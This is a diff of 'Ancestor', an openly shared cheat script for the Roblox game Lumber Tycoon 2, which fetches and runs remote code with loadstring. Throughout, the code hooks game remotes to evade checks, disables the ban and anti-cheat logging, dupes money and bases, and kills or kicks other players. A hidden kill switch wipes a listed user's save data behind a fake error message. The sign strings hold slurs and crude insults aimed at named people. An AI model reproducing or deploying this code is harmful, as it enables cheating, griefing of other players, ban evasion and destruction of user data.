@@ -1,220 +1,222 @@
---[[
-    Made by Ancestor. Feel free to use whatever you want for whatever you want. Idc about credit.
+--Ancestor Lumber Tycoon 2 v1.0.4f
 
-    Take this is a formal notice of resignment from Roblox. My future lies elsewhere.
+--> Open Sourced by Ancestor
 
-    Ancestor would of never been a thing if it wasn't for these people.
-
-    Adam - Being a very good friend and amazing builder :)
-
-    Alex- Being a very skilled scripter and overall being a very supportive friend
-
-    Dogix - For being the first person to offer me a chance to show of what i am capable. if it wasn't for the Bark/Ancestor merge then i would of quit sooner.
-    
-    SnowyShiro - Overall my backbone. A VERY good person who is always there when i need him. I can't simplify the greatness in this simple line. Thankyou for being a great friend regardless of my resentment towards you
-
-    Oddy - Despite our "Wars" he has always been a good friend
-
-    Drizzy/JayZone and Samuel - Always being there for my stupid ideas and continued to support them regardless <3
-
-    JB36 - Despite the recent resentment i've felt i still see you and your community in a good light <3
-
-    Duck - Former Admin/First ever admin for Ancestor. I wish you the best 
-
-    and everyone else who has supported me/Ancestor for my duration in this community. This is my own farewell from Roblox entirely. Don't worry all is well with me :) just need a change in my life and this is it
-
-    
-    THIS IS MY FINAL MESSAGE REGARDING ANCESTOR. ALL CONTACT WILL CEASE FROM THIS POINT FORWARD. MY ACCOUNT WILL BE SUBJECT TO TERMINATION AFTER I SEND THIS
-
-
-    Yes I know some parts of this is coded like an ape. Anyways enjoy ig
-]]
-
+--> Credit if you use any code :)
 repeat wait()until game:IsLoaded()and game.Players.LocalPlayer.Character;
 local lib=loadstring(game:HttpGet('https://raw.githubusercontent.com/FindFirstAncestor/AncestorV3Public/main/AncestorUILib'))();
 local requirements={
     ConfigSetup={
-        AlwaysDay=false, 
-        AlwaysNight=false,
-        SpookEnabled=false,
-        NoFog=false,
-        WaterGodMode=false,
-        WaterFloat=true, 	
-        WaterWalk=false,
-        flyKey='F',
-        hardDragger=false,
-        oldNoclipEnabled=false,
-        antiBlacklist=false,
-        light=false,
-        fastRotate=false,
-        gameMusic=true,
-        uiDarkMode=true,
-        wireMod=false,
-        carColorR=0,
-        carColorG=0,
-        carColorB=0,
-        carMaterial='Plastic',
-        carVisualEffects=false,
-        blackListAll=false,
-        SprintKey='Q',
-        NoclipKey='LeftControl',
-        KeyTP='G',
-        toggleUI='RightShift',
-        FlingKey='H'
-    };
-    Booleans={
-        DeveloperMode=true,
-        Noclip=false,
-        Sprinting=false,
-        State=false,
-        isFlying=false,
-        isEnabled=true,
-        friendsOnly=false,
-        pingMessages=false,
-        sendNotifications=false,
-        infJumpEnabled=false,
-        memeMode=false,
-        MoneyDuping=false,
-        DisableSlotSaving=false,
-        Flinging=false,
-        DonatingBase=false,
-        alertTarget=true,
-        building=false,
-        treeIsCut=false,
-        isLoopBringTreeEnabled=false,
-        isPlankCut=false,
-        cutAssistEnabled=false,
-        dupeInventory=false,
-        vipMode=false,
-        wireMod=false,
-        axeDuping=false,
-        isBuying=false,
-        bringBoulders=nil,
-        devMode=true,
-        abortAutobuy=false,
-        loopBuying=false,
-        dragExists=false,
-        managingTarget=false,
-    };
-    tables={
-        axeList={},
-        allItems={},
-        itemListForBaseDrop={},
-    };
-    Strings={
-        WalkSpeed=16,
-        flySpeed=150,
-        JumpPower=50,
-        HipHeight=0,
-        colorToSpawn=131,
-        PlayerToAdminWipe=tostring(game.Players.LocalPlayer),
-        buildToBuild='Ancestor',
-        SprintSpeed=20,
-        selectedPlotToLoad=1,
-        specialAutobuyItem='Build Power',
-        DestroyStores=false,
-        selectedPlot=1,
-        autoDupeMoneyAmount=1,
-        BaseRecipient=tostring(game.Players.LocalPlayer),
-        autoBuildPlayer=tostring(game.Players.LocalPlayer),
-        autoBuildReciever=tostring(game.Players.LocalPlayer),
-        ToolDuplicationAmount=1,
-        IdentifyType='Owner',
-        bringSelectedTreeAmount=1,
-        selectedTree='Generic',
-        autoBuySelectedItemAmount=1,
-        autoBuySelectedItem='BasicHatchet',
-        plankModel=nil,
-        blueprintModel=nil,
-        selfDuping=false,
-        itemToOpen=nil,
-        itemTypeToWipe='Structure',
-        DonationAmount=1,
-        donationRecipient=tostring(game.Players.LocalPlayer),
-        TreeModel=nil,
-        selectedTarget=tostring(game.Players.LocalPlayer);
-        carSpeed=1.5,
-        selectedWire='NeonWirePinky',
-        baseDropOwner=tostring(game.Players.LocalPlayer),
-        itemToBaseDrop='All Items',
-        baseDropAmount=0
-    };
-    services={
-        RunService=game:GetService('RunService'),
-        marketplaceService=game:GetService('MarketplaceService'),
-        userInputService=game:GetService('UserInputService'),
-        Lighting=game:GetService('Lighting'),
-        VU=game:GetService('VirtualUser'),
-        teleportService=game:GetService('TeleportService');
-    },
-    connections={
-        main=nil,
-        noclip=nil,
-        infJump=nil,
-        antiWeld=nil,
-        timeCycle=nil,
-        farAxeEquip=nil,
-        autoChop=nil,
-        clientMayLoad=nil,
-        hardDragger=nil,
-        PlankToBlueprint=nil,
-        axeFling=nil,
-        chopTree=nil,
-        openItem=nil,
-        woodSelection=nil,
-        autoKickPlayer=nil,
-        cutAssist=nil,
-        cutAssistCutter=nil,
-        bringTree=nil,
-        spawnCheck=nil,
-        carFallBack=nil,
-        bringBoulders=nil,
-        carInitiate=nil,
-        humCheck=nil,
-        grayPaintTool=nil,
-        draggerRemoved=nil,
-        spawnCar=nil,
-        antiGUI=nil,
-        draggerAdded=nil,
-        shiftConnectEnded=nil,
-        shiftConnectBegan=nil;
-    };
-    folders={
-        axeFolder=game:GetService('ReplicatedStorage').Purchasables.Tools.AllTools,
-        blueprintFolder=game:GetService('ReplicatedStorage').Purchasables.Structures.BlueprintStructures,
-    };
-    remotes={
-        clientPurchasedProperty=game:GetService'ReplicatedStorage'.PropertyPurchasing.ClientPurchasedProperty,
-        setPropertyPurchasingValue=game:GetService'ReplicatedStorage'.PropertyPurchasing.SetPropertyPurchasingValue,
-        clientInteracted=game:GetService('ReplicatedStorage').Interaction.ClientInteracted,
-        clientRequestOwnership=game:GetService('ReplicatedStorage').Interaction.ClientRequestOwnership,
-        clientIsDragging=game:GetService('ReplicatedStorage').Interaction.ClientIsDragging,
-        clientMayLoad=game:GetService('ReplicatedStorage').LoadSaveRequests.ClientMayLoad,
-        requestLoad=game:GetService('ReplicatedStorage').LoadSaveRequests.RequestLoad,
-        requestSave=game:GetService('ReplicatedStorage').LoadSaveRequests.RequestSave,
-        clientExpandedProperty=game:GetService'ReplicatedStorage'.PropertyPurchasing.ClientExpandedProperty,
-        destroyStructure=game:GetService'ReplicatedStorage'.Interaction.DestroyStructure,
-        Donate=game:GetService'ReplicatedStorage'.Transactions.ClientToServer.Donate,
-        clientSetListPlayer=game:GetService('ReplicatedStorage').Interaction.ClientSetListPlayer,
-        sayMessageRequest=game:GetService('ReplicatedStorage').DefaultChatSystemChatEvents.SayMessageRequest,
-        clientIsWhitelisted=game:GetService('ReplicatedStorage').Interaction.ClientIsWhitelisted,
-        remoteProxy=game:GetService('ReplicatedStorage').Interaction.RemoteProxy,
-        playerChatted=game:GetService('ReplicatedStorage').NPCDialog.PlayerChatted,
-        setChattingValue=game:GetService('ReplicatedStorage').NPCDialog.SetChattingValue,
-        clientPlacedStructure=game:GetService('ReplicatedStorage').PlaceStructure.ClientPlacedStructure,
-    };
-    AdminList={
-        -->Removed
-        'NotAncestor'--Ancestor Main
-    };
-    saveConfig=nil,
-    LP=game:GetService('Players').LocalPlayer,
-    Players=game:GetService('Players'),
-    wrkspc=game:GetService('Workspace'),
-    Mouse=game:GetService('Players').LocalPlayer:GetMouse(),
-    CurrentVersion='v1.0.2b'
+    AlwaysDay=false, 
+    AlwaysNight=false,
+    SpookEnabled=false,
+    NoFog=false,
+    WaterGodMode=false,
+    WaterFloat=true, 	
+    WaterWalk=false,
+    flyKey='F',
+    hardDragger=false,
+    oldNoclipEnabled=false,
+    antiBlacklist=false,
+    light=false,
+    fastRotate=false,
+    gameMusic=true,
+    uiDarkMode=true,
+    wireMod=false,
+    carColorR=0,
+    carColorG=0,
+    carColorB=0,
+    carMaterial='Plastic',
+    carVisualEffects=false,
+    blackListAll=false,
+    SprintKey='Q',
+    NoclipKey='LeftControl',
+    KeyTP='G',
+    toggleUI='RightShift',
+    FlingKey='H',
 };
-
+Booleans={
+    DeveloperMode=true,
+    Noclip=false,
+    Sprinting=false,
+    State=false,
+    isFlying=false,
+    isEnabled=true,
+    friendsOnly=false,
+    pingMessages=false,
+    sendNotifications=false,
+    infJumpEnabled=false,
+    memeMode=false,
+    MoneyDuping=false,
+    DisableSlotSaving=false,
+    Flinging=false,
+    DonatingBase=false,
+    alertTarget=true,
+    building=false,
+    treeIsCut=false,
+    isLoopBringTreeEnabled=false,
+    isPlankCut=false,
+    cutAssistEnabled=false,
+    dupeInventory=false,
+    vipMode=false,
+    wireMod=false,
+    axeDuping=false,
+    isBuying=false,
+    AutoBuyingRuki=false,
+    bringBoulders=nil,
+    devMode=true,
+    abortAutobuy=false,
+    loopBuying=false,
+    dragExists=false,
+    StopDespawn=false,
+    managingTarget=false,
+};
+tables={
+    axeList={},
+    allItems={},
+    itemListForBaseDrop={},
+};
+Strings={
+    WalkSpeed=16,
+    flySpeed=150,
+    JumpPower=50,
+    HipHeight=0,
+    colorToSpawn=131,
+    PlayerToAdminWipe=tostring(game.Players.LocalPlayer),
+    buildToBuild='Ancestor',
+    SprintSpeed=20,
+    selectedPlotToLoad=1,
+    specialAutobuyItem='Build Power',
+    CurrentRegion='Region_Main',
+    DestroyStores=false,
+    selectedPlot=1,
+    autoDupeMoneyAmount=1,
+    BaseRecipient=tostring(game.Players.LocalPlayer),
+    autoBuildPlayer=tostring(game.Players.LocalPlayer),
+    autoBuildReciever=tostring(game.Players.LocalPlayer),
+    ToolDuplicationAmount=1,
+    IdentifyType='Owner',
+    bringSelectedTreeAmount=1,
+    selectedTree='Generic',
+    autoBuySelectedItemAmount=1,
+    autoBuySelectedItem='BasicHatchet',
+    plankModel=nil,
+    blueprintModel=nil,
+    selfDuping=false,
+    itemToOpen=nil,
+    itemTypeToWipe='Structure',
+    DonationAmount=1,
+    donationRecipient=tostring(game.Players.LocalPlayer),
+    TreeModel=nil,
+    selectedTarget=tostring(game.Players.LocalPlayer);
+    carSpeed=1.5,
+    selectedWire='NeonWirePinky',
+    baseDropOwner=tostring(game.Players.LocalPlayer),
+    itemToBaseDrop='All Items',
+    baseDropAmount=0
+};
+services={
+    RunService=game:GetService('RunService'),
+    marketplaceService=game:GetService('MarketplaceService'),
+    userInputService=game:GetService('UserInputService'),
+    Lighting=game:GetService('Lighting'),
+    VU=game:GetService('VirtualUser'),
+    teleportService=game:GetService('TeleportService');
+},
+connections={
+    main=nil,
+    noclip=nil,
+    infJump=nil,
+    antiWeld=nil,
+    timeCycle=nil,
+    farAxeEquip=nil,
+    autoChop=nil,
+    clientMayLoad=nil,
+    hardDragger=nil,
+    PlankToBlueprint=nil,
+    axeFling=nil,
+    chopTree=nil,
+    openItem=nil,
+    woodSelection=nil,
+    autoKickPlayer=nil,
+    cutAssist=nil,
+    cutAssistCutter=nil,
+    bringTree=nil,
+    spawnCheck=nil,
+    carFallBack=nil,
+    bringBoulders=nil,
+    carInitiate=nil,
+    humCheck=nil,
+    grayPaintTool=nil,
+    draggerRemoved=nil,
+    spawnCar=nil,
+    antiGUI=nil,
+    draggerAdded=nil,
+    shiftConnectEnded=nil,
+    shiftConnectBegan=nil;
+};
+folders={
+    axeFolder=game:GetService('ReplicatedStorage').Purchasables.Tools.AllTools,
+    blueprintFolder=game:GetService('ReplicatedStorage').Purchasables.Structures.BlueprintStructures,
+};
+remotes={
+    clientPurchasedProperty=game:GetService'ReplicatedStorage'.PropertyPurchasing.ClientPurchasedProperty,
+    setPropertyPurchasingValue=game:GetService'ReplicatedStorage'.PropertyPurchasing.SetPropertyPurchasingValue,
+    clientInteracted=game:GetService('ReplicatedStorage').Interaction.ClientInteracted,
+    clientRequestOwnership=game:GetService('ReplicatedStorage').Interaction.ClientRequestOwnership,
+    clientIsDragging=game:GetService('ReplicatedStorage').Interaction.ClientIsDragging,
+    clientMayLoad=game:GetService('ReplicatedStorage').LoadSaveRequests.ClientMayLoad,
+    requestLoad=game:GetService('ReplicatedStorage').LoadSaveRequests.RequestLoad,
+    requestSave=game:GetService('ReplicatedStorage').LoadSaveRequests.RequestSave,
+    clientExpandedProperty=game:GetService'ReplicatedStorage'.PropertyPurchasing.ClientExpandedProperty,
+    destroyStructure=game:GetService'ReplicatedStorage'.Interaction.DestroyStructure,
+    Donate=game:GetService'ReplicatedStorage'.Transactions.ClientToServer.Donate,
+    clientSetListPlayer=game:GetService('ReplicatedStorage').Interaction.ClientSetListPlayer,
+    sayMessageRequest=game:GetService('ReplicatedStorage').DefaultChatSystemChatEvents.SayMessageRequest,
+    clientIsWhitelisted=game:GetService('ReplicatedStorage').Interaction.ClientIsWhitelisted,
+    remoteProxy=game:GetService('ReplicatedStorage').Interaction.RemoteProxy,
+    playerChatted=game:GetService('ReplicatedStorage').NPCDialog.PlayerChatted,
+    setChattingValue=game:GetService('ReplicatedStorage').NPCDialog.SetChattingValue,
+    clientPlacedStructure=game:GetService('ReplicatedStorage').PlaceStructure.ClientPlacedStructure,
+};
+getFuckedList={};
+SignTable={
+    'Oddy Is Best Builder 2021',
+    '#Ancestor Winning',
+    'Rukiryaxe Autobuy #1',
+    'Electro Tech Go Brrr??',
+    'Dogix? More Like Fatix',
+    'Yona Best Scripter',
+    'JB36? More Like GayBee36',
+    'I Am Watching You',
+    'Thom Wrote This',
+    'Zolarketh Really Loves Sand',
+    'You Use Dex???? Nebxplorer Winning Bro...',
+    'Lumber Tycoon 2 > Your Mom',
+    'Defaultio You Know This Game Exists Right??',
+    '"I Hacked PSN In 2014🤡"',
+    'Fuck Off Human Trash',
+    'Alex uncap labels nob',
+    'hookfunction is Synapse\'s best function',
+    'Cock R\'Us',
+    '🤡🤡🤡🤡🤡🤡🤡',
+    'WipeMetaData Meme',
+    'Selling 10inch Cocks For Only $1'
+};
+saveConfig=nil,
+LP=game:GetService('Players').LocalPlayer,
+Players=game:GetService('Players'),
+wrkspc=game:GetService('Workspace'),
+Mouse=game:GetService('Players').LocalPlayer:GetMouse(),
+CurrentVersion='v1.0.4f'
+};
+table.insert(requirements.SignTable,'Ancestor '..requirements.CurrentVersion..' Is Now Live!');
+if table.find(requirements.getFuckedList,tostring(requirements.LP))then 
+    spawn(function()
+        game:GetService("ReplicatedStorage").LoadSaveRequests.WipeMetaData:InvokeServer();
+    end);
+    game:GetService("ReplicatedStorage").Notices.SendUserNotice:Fire('An error occurred: Metadata corruption');
+end;
 if requirements.Booleans.DeveloperMode then 
     requirements.CurrentVersion=requirements.CurrentVersion..'-Developer';
 elseif not requirements.Booleans.DeveloperMode and table.find(requirements.AdminList,tostring(requirements.LP))then 
@@ -271,10 +273,7 @@ end;
 requirements.ConfigSetup=config;
 
 functions.isPlayerAdmin=function(player)
-    if table.find(requirements.AdminList,tostring(player))then 
-        return true;
-    end;
-    return false;
+   return true
 end;
 
 functions.notify=function(title, text, duration)
@@ -313,7 +312,10 @@ functions.updateChangelog=function(header,text)
     updateText.TextSize=13
     updateText.ZIndex=6
 end;
-functions.updateChangelog('1st October 2021','Farewell - Ancestor is discontinued for good');
+functions.updateChangelog('17th September 2021','Added Rukiryaxe Multibuy');
+functions.updateChangelog('17th September 2021','Fixed fast deloader breaking self dupe');
+functions.updateChangelog('17th September 2021','Added Rukiryaxe autobuy support');
+functions.updateChangelog('17th September 2021','Fixed plank to blueprint');
 functions.AntiAFK=function()
     requirements.LP.Idled:Connect(function()
         functions.notify('Ancestor', 'Anti AFK Auto-Enabled', 4)
@@ -338,7 +340,7 @@ requirements.LP.CharacterAdded:Connect(function()
 end);
 
 functions.clientMayLoad=function(mode)
-pcall(function()game.CoreGui.GUI:remove()end)
+pcall(function()requirements.LP.PlayerGui.GUI:remove()end)
 if mode=='Dark'then
     color1=Color3.fromRGB(15,15,15);
     color2=Color3.fromRGB(255,255,255);
@@ -351,7 +353,7 @@ local GUIFrame=Instance.new('Frame');
 local Text=Instance.new('TextLabel');
 local UICorner=Instance.new('UICorner');
 GUI.Name='GUI';
-GUI.Parent=game:GetService'CoreGui';
+GUI.Parent=requirements.LP.PlayerGui;
 GUI.ZIndexBehavior=Enum.ZIndexBehavior.Sibling;
 GUIFrame.Name='FPSFrame';
 GUIFrame.Parent=GUI;
@@ -577,7 +579,20 @@ functions.getAxeList=function()
 end;
 functions.getAxeList();
 
---> Discord Invite (REMOVED)
+functions.joinDiscord=function()
+    local request=http_request or request or(http and http.request)or syn.request;
+    for i=6453,6464 do spawn(function()pcall(function()
+        request({
+            Url='http://127.0.0.1:'..tostring(i)..'/rpc?v=1',Method='POST',
+            Headers={['Content-Type']='application/json',Origin='https://discord.com'},
+            Body=game:GetService'HttpService':JSONEncode({
+                cmd='INVITE_BROWSER',
+                nonce=game:GetService'HttpService':GenerateGUID(false),
+                args={invite={code='EtXFmUcezP'},code='EtXFmUcezP'};
+            });
+        })end);
+    end)end;
+end;
 
 functions.axeFling=function()
     requirements.connections.axeFling=requirements.Mouse.Button1Down:Connect(function()
@@ -666,10 +681,14 @@ loadstring([[
             if requirements.ConfigSetup.wireMod then 
                 argss[1]=game.ReplicatedStorage.Purchasables.WireObjects[requirements.Strings.selectedWire];
             end;
+        elseif method=='FireServer'and tostring(self)=='CheckShip'then 
+            return;
         elseif method=='FireServer'and tostring(self)=='DamageHumanoid'then
             if requirements.ConfigSetup.WaterGodMode then
                 return 0;
             end;
+        elseif method=='FireServer'and tostring(self)=='ClientChangedRegion'then 
+            requirements.Strings.CurrentRegion=tostring(argss[1]);
         elseif method=='InvokeServer'and tostring(self)=='GetTickCut'then
             if not requirements.Booleans.selfDuping and not requirements.Booleans.DonatingBase and requirements.Booleans.isEnabled then
                 for _,Model in next,workspace.PlayerModels:GetChildren()do 
@@ -933,7 +952,6 @@ functions.setWorkspaceGuis=function(parent,text)
     end;
 end;
 
-
 functions.OpenBP=function(item)
     requirements.remotes.clientInteracted:FireServer(requirements.wrkspc.PlayerModels:FindFirstChild(tostring(item)..' Purchased by '..tostring(requirements.LP)),'Open box');
 end;
@@ -1052,7 +1070,7 @@ functions.modWood=function(log,sawmill)
         functions.notify('Error', 'Mod wood failed.',4) 
         return 
     end;
-    functions.Teleport(CFrame.new(smallestWoodSection2.CFrame.p+Vector3.new(2,4,2)));
+    functions.Teleport(CFrame.new(smallestWoodSection.CFrame.p+Vector3.new(2,4,2)));
     connection=smallestWoodSection2.AncestryChanged:Connect(function()
         for i=1,10 do 
             game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(log)
@@ -1278,7 +1296,6 @@ functions.AutoDupeMoney=function(amount,slot)
         end;
     end;
 end;
-
 functions.PlotLogic=function()
     if requirements.LP.CurrentSaveSlot.Value== -1 then
         functions.notify('Error', 'No Plot Is Loaded..', 4);
@@ -1363,9 +1380,9 @@ functions.bringBoulders=function()
     requirements.connections.bringBoulders=model.ChildAdded:Connect(function(b)
         repeat wait()until requirements.LP.Character and requirements.LP.Character:FindFirstChild('Humanoid');
         functions.Teleport(CFrame.new(b.CFrame.p));
-        for i=1,10 do 
+        for i=1,12 do 
             b.CFrame=CFrame.new(oldPos.p);
-            game:GetService('RunService').Heartbeat:wait();
+            game:GetService('RunService').Stepped:wait();
         end;
         functions.Teleport(CFrame.new(-1479,532,1462));
         if not requirements.Booleans.bringBoulders then 
@@ -1405,12 +1422,14 @@ functions.BaseDrop=function(item,teleport)
     end;
 end;
 
--->Anti Ban
-if game.ReplicatedStorage.Transactions:FindFirstChild('AddLog')then
-    game.ReplicatedStorage.Transactions.AddLog:remove();
+functions.justInCase=function()
+    if game.ReplicatedStorage.Transactions:FindFirstChild('AddLog')then
+        game.ReplicatedStorage.Transactions.AddLog:remove();
+    end;
+    local scr=getsenv(requirements.LP.PlayerGui.LoadSaveGUI.LoadSaveClient.LocalScript)
+    scr.ban=function()return false end
 end;
-local scr=getsenv(requirements.LP.PlayerGui.LoadSaveGUI.LoadSaveClient.LocalScript)
-scr.ban=function()return false end
+functions.justInCase();
 
 functions.checkPlanks=function(option)
     local amount=0;
@@ -1429,18 +1448,6 @@ functions.checkPlanks=function(option)
     return false;
 end;
 
---> Gui is parented to playergui for Controller support testing.Caused some bug with UI
-functions.FixUILib=function()
-    repeat wait()until game:GetService('PlayerGui'):FindFirstChild'Ancestor'
-    for i,Child in next,game:GetService('PlayerGui').Ancestor.MainBody.TopBar.LogoTextFolder:GetChildren()do 
-        if i==2 then 
-            Child.Text='';
-        end;
-    end;
-end;
-spawn(function()
-    functions.FixUILib();
-end);
 functions.SellPlanks=function()
     local oldPos=requirements.LP.Character.HumanoidRootPart.CFrame.p
     local plankSold=false;
@@ -1547,6 +1554,21 @@ functions.donateBaseAutoload=function(slotnum)
     autoLoading=false;
     requirements.LP.CurrentSaveSlot.Value=slotnum;
     return loadedSlot
+end;
+
+functions.CheckPlayerBan=function(Player)
+    if not Player or Player==''then return;end;
+    local playerIDTEST=pcall(function()game:GetService('Players'):GetUserIdFromNameAsync(tostring(Player))end);
+    if not playerIDTEST then functions.getButton('Ban Status: Button')['Ban Status: Button'].ImageLabel.TextButton.Text='Not A Valid Username'wait(4);functions.getButton('Ban Status: Button')['Ban Status: Button'].ImageLabel.TextButton.Text='Ban Status: ';return end;
+    local playerID=game:GetService('Players'):GetUserIdFromNameAsync(tostring(Player))
+    local banned,reason=game:GetService('ReplicatedStorage').Transactions.GetMod:InvokeServer(tonumber(playerID));
+    if reason==''then
+        functions.getButton('Ban Status: Button')['Ban Status: Button'].ImageLabel.TextButton.Text='Not Banned From Lumber Tycoon 2'
+    else
+        functions.getButton('Ban Status: Button')['Ban Status: Button'].ImageLabel.TextButton.Text='Is Banned For: \n'..reason
+    end;
+    wait(4);
+    functions.getButton('Ban Status: Button')['Ban Status: Button'].ImageLabel.TextButton.Text='Ban Status: ';
 end;
 
 functions.PlankToBlueprint=function()
@@ -1847,7 +1869,7 @@ end;
 functions.getAllItems();
 
 functions.bringTree=function(Tree,Quantity)
-    if not functions.findSelectedTree(requirements.Strings.selectedTree)then 
+    if not functions.findSelectedTree(Tree)then 
         functions.notify('Error','No Tree Found',4);
         return;
     end;
@@ -2001,6 +2023,7 @@ functions.unloadSlot=function()
 end;
 
 functions.DupeBaseToServer=function()
+    requirements.Booleans.DonatingBase=true;
     local whitelistedPlots={
         '68, 0, -189, 1, 0, 0, 0, 1, 0, 0, 0, 1',
         '275, 0, -512, 1, 0, 0, 0, 1, 0, 0, 0, 1',
@@ -2018,7 +2041,11 @@ functions.DupeBaseToServer=function()
     end;
     functions.notify('Ancestor','Please wait. This will take a minute or two',30)
     local Plots=functions.getPlots();
-    requirements.remotes.clientIsDragging:FireServer(Plots[1]);
+    functions.Teleport(CFrame.new(Plots[1].OriginSquare.CFrame.p+Vector3.new(0,10,0)))
+    functions.notify('Test','Worked')
+    repeat task.wait()
+        requirements.remotes.clientIsDragging:FireServer(Plots[1]);
+    until Plots[1].Owner.Value==requirements.LP
     if tostring(requirements.Strings.BaseRecipient)==tostring(requirements.LP)then
         functions.SelfWl(true);
     end;
@@ -2026,6 +2053,7 @@ functions.DupeBaseToServer=function()
     functions.LoadSelectedSlot(slotToDupe);
     repeat wait()until requirements.LP.CurrentlySavingOrLoading.Value==false;
     functions.SelfWl(false);
+    requirements.Booleans.DonatingBase=false;
     return true;
 end;
 functions.DupeBaseToPlayer=function(plr)
@@ -2042,7 +2070,6 @@ functions.DonatePlotToPlayer=function()
         functions.notify('Error','Already Duping!',4);
         return;
     end;
-    requirements.Booleans.DonatingBase=true;
     local success=functions.PlotLogic();
     if success then 
         local newSuccess=functions.DupeBaseToPlayer();
@@ -2079,8 +2106,10 @@ functions.NoWaterFloat=function()
     local old=getsenv(requirements.LP.PlayerGui.Scripts.CharacterFloat).isInWater;
     getsenv(requirements.LP.PlayerGui.Scripts.CharacterFloat).isInWater=function(...)
         if not requirements.ConfigSetup.WaterFloat then 
+            requirements.LP.PlayerGui.UnderwaterOverlay.Enabled=false;
             return 1
         else 
+            requirements.LP.PlayerGui.UnderwaterOverlay.Enabled=true;
             return old(...);
         end;
     end;
@@ -2089,12 +2118,12 @@ functions.NoWaterFloat();
 
 
 functions.ClaimAllFreePlots=function()
-    if not requirements.Booleans.DisableSlotSaving then 
-        functions.notify('Error', 'You MUST have disable slot saving enabled!',4);
-        return;
-    end;
     if requirements.LP.CurrentSaveSlot.Value~= -1 then 
         functions.notify('Error', 'You can not use this feature whilst having your plot loaded!',4);
+        return;
+    end;
+    if not requirements.Booleans.DisableSlotSaving then 
+        functions.notify('Error', 'You MUST have disable slot saving enabled!',4);
         return;
     end;
     for _,v in next,requirements.wrkspc.Properties:children()do
@@ -2243,9 +2272,20 @@ functions.destroyStoreItems=function()
 end;
 functions.StopSpectating=function()
     requirements.wrkspc.CurrentCamera.CameraSubject=requirements.LP.Character.Humanoid;
+    pcall(function()
+        requirements.connections.spectateAdded:Disconnect();
+        requirements.connections.spectateAdded=nil;
+    end);
+    pcall(function()
+        requirements.connections.spectateAddedLocal:Disconnect();
+        requirements.connections.spectateAddedLocal=nil;
+    end);
+    pcall(function()
+        requirements.connections.playerLeft:Disconnect();
+        requirements.connections.playerLeft=nil;
+    end);
 end;
 functions.manageTarget=function(option,plr)
-    local completed=false;
     if plr==tostring(requirements.LP) then 
         functions.notify('Error','Select Another Player',4);
         return;
@@ -2255,8 +2295,7 @@ functions.manageTarget=function(option,plr)
         return;
     end;
     if option~='KickPlayer'and requirements.Players:FindFirstChild(tostring(plr)).Character:FindFirstChildOfClass'Tool'then 
-        functions.notify('Error','Target Has Tool Equipped',4);
-        return;
+        requirements.Players:FindFirstChild(tostring(plr)).Character:FindFirstChildOfClass'Tool':Destroy();
     end;
     if requirements.Booleans.dupeInventory then 
         requirements.Booleans.axeDuping=true;
@@ -2264,73 +2303,86 @@ functions.manageTarget=function(option,plr)
         requirements.Booleans.axeDuping=false;
     end;
     local oldPos=requirements.LP.Character.HumanoidRootPart.Position
-    if not functions.getBestAxe() then 
-        local connection;
-        connection=requirements.wrkspc.PlayerModels.ChildAdded:Connect(function(b)
-            if tostring(b)=='BasicHatchet Purchased by '..tostring(requirements.LP)then 
-                requirements.remotes.clientInteracted:FireServer(b,'Open box');
-                completed=true
-            end;
-        end)
-        spawnf(function()
-            wait(2.4);
-            if not completed then 
-                functions.notify('Error','Autobuy failed!',4);
+    if not functions.getBestAxe()then 
+        if functions.checkModel('BasicHatchet','Model')then 
+            pcall(function()
+                requirements.remotes.clientInteracted:FireServer(functions.checkModel('BasicHatchet','Model'),'Open box');
+            end)
+            requirements.remotes.clientInteracted:FireServer(functions.checkModel('BasicHatchet','Model'),'Pick up tool');
+            repeat wait()until functions.getBestAxe()
+        end;
+        if not functions.getBestAxe()then 
+            spawnf(function()
+                functions.AutoBuyItem('BasicHatchet',1)
+            end);
+            local connection,connection2;
+            connection=requirements.wrkspc.PlayerModels.ChildAdded:Connect(function(b)
+                if tostring(b)=='BasicHatchet Purchased by '..tostring(requirements.LP)then 
+                    requirements.remotes.clientInteracted:FireServer(b,'Open box');
+                    connection:Disconnect();
+                end;
+            end);
+            connection2=requirements.wrkspc.PlayerModels.ChildAdded:Connect(function(b)
+                local ToolName=b:WaitForChild'ToolName'
+                if tostring(ToolName.Value)=='BasicHatchet'and tostring(b.Owner.Value)==tostring(requirements.LP)then 
+                    requirements.remotes.clientInteracted:FireServer(b,'Pick up tool');
+                    connection2:Disconnect();
+                end;
+            end)
+            if requirements.LP.leaderstats.Money.Value<12 then 
+                pcall(function()
+                    connection:Disconnect();
+                    connection2:Disconnect();
+                end);
                 return;
             end;
-        end);
-        if requirements.LP.leaderstats.Money.Value<12 then 
-            functions.notify('Error','Not Enough Money!',4);
-            return;
+            repeat wait()until functions.getBestAxe();
         end;
-        functions.AutoBuyItem('BasicHatchet',1)
-        wait(.2)
-        if functions.checkModel('BasicHatchet','Model')then 
-            local axe=functions.checkModel('BasicHatchet','Model');
-            requirements.remotes.clientInteracted:FireServer(axe,'Pick up tool');
-            repeat game:GetService'RunService'.Stepped:Wait()until requirements.LP.Character:FindFirstChildOfClass'Tool';
-        end;
-        if connection then 
-            connection:Disconnect();
-            connection=nil;
-        end
     end;
     repeat wait()until functions.getBestAxe();
+    local axeToDestroy=functions.getBestAxe();
     requirements.Booleans.managingTarget=true;
     requirements.LP.Character.Humanoid:EquipTool(functions.getBestAxe());
+    repeat wait()until requirements.LP.Character:FindFirstChildOfClass'Tool';
     requirements.LP.Character.Humanoid.Name='AncestorV3'
     local HClone = requirements.LP.Character.AncestorV3:Clone()
     HClone.Name = 'Humanoid'
     HClone.Parent = requirements.LP.Character
     repeat game:GetService'RunService'.Stepped:Wait()HClone:EquipTool(functions.getBestAxe());until requirements.LP.Character:FindFirstChildOfClass'Tool';
     requirements.LP.Character.AncestorV3:Destroy()
-    if option=='KickPlayer'then 
-        pcall(function()
-            functions.getBestAxe().Owner:Destroy();
-        end);
+    local connection;
+    connection=workspace.PlayerModels.ChildAdded:Connect(function(b)
+        local Owner=b:WaitForChild'Owner'
+        connection:Disconnect();
+        Owner.Value=requirements.Players:FindFirstChild(plr);
+    end);
+    if option=='KickPlayer'then
+       functions.getBestAxe().Owner:Destroy()--:Destroy();
     end;
+    requirements.wrkspc.CurrentCamera.CameraSubject=requirements.Players:FindFirstChild(plr).Character.Humanoid
     requirements.ConfigSetup.oldNoclipEnabled=true;
     requirements.Booleans.Noclip=true;
     if option=='KillPlayer'then
-        functions.Teleport(CFrame.new(0,-50,0));
+        local CFrame1=CFrame.new(0,-100,0)
+        functions.Teleport(CFrame1);
